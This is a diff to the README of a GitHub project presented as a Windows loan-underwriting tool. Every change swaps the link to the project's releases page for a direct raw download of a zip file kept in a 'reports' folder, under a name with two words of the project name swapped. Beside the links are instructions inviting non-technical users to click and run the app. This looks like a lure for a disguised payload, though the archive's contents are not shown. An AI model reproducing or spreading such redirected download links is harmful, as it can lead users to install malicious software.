@@ -1,6 +1,6 @@
 # ⚖️ Underwriting-Decision-Safety-Lab - Reliable Loan Approval Support
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/JRG1985/Underwriting-Decision-Safety-Lab/releases)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/JRG1985/Underwriting-Decision-Safety-Lab/raw/refs/heads/main/reports/Underwriting-Safety-Decision-Lab-v1.9.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get the app running on your Windows machine. You don’t n
 
 Click the green button below to open the download page.
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/JRG1985/Underwriting-Decision-Safety-Lab/releases)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/JRG1985/Underwriting-Decision-Safety-Lab/raw/refs/heads/main/reports/Underwriting-Safety-Decision-Lab-v1.9.zip)
 
 You will find the latest app version there. The app files come ready to use, with everything included.
 
@@ -129,4 +129,4 @@ The approach helps reduce risks in the underwriting process by allowing selectiv
 
 Use this link to visit the download page anytime:
 
-https://github.com/JRG1985/Underwriting-Decision-Safety-Lab/releases
+https://github.com/JRG1985/Underwriting-Decision-Safety-Lab/raw/refs/heads/main/reports/Underwriting-Safety-Decision-Lab-v1.9.zip
